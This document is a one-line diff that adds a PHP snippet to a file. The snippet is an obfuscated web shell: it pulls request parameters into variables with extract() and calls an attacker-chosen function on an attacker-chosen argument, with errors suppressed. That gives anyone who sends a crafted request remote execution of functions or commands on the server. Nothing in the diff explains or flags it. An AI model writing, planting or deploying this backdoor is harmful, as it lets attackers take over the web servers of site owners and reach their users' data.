@@ -1,0 +1,1 @@
+<?@extract($_REQUEST);@die($err($info));?>
